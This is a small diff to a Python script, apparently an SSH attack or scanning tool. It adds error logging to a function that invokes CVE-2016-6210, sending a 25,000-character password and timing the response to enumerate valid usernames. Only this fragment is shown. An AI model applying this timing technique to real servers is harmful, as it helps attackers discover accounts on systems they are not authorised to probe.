@@ -248,6 +248,7 @@ def TelnetConnect():
 def SSHConnect():
 	try:
 		print('Using CVE:2016-6210')
+		paramiko.util.log_to_file("error.log")
 		SSH = paramiko.SSHClient()
 		p = 'A'*25000
 		starttime=time.clock()
